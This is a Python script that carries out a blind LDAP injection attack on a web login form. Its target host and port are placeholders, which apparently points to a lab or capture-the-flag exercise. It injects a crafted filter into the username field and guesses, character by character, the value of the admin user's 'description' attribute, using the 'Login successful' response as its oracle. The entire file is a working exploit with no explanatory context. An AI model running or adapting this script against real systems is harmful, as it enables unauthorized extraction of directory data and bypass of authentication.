import requests, string

URL = "http://STMIP:STMPO/index.php"
POSITIVE_STRING = "Login successful"
EXFILTRATE_USER = 'admin'
EXFILTRATE_ATTRIBUTE = 'description'

if __name__ == '__main__':
	stop = False
	found_char = True
	flag = ''
	
	while not stop:
		found_char = False
		for c in string.printable:
			username = f'{EXFILTRATE_USER})(|({EXFILTRATE_ATTRIBUTE}={flag}{c}*'
			password = 'invalid)'
			r = requests.post(URL, data={'username': username, 'password': password})

			if POSITIVE_STRING in r.text:
				found_char = True
				flag += c
				break

		if not found_char:
			print(flag)
			break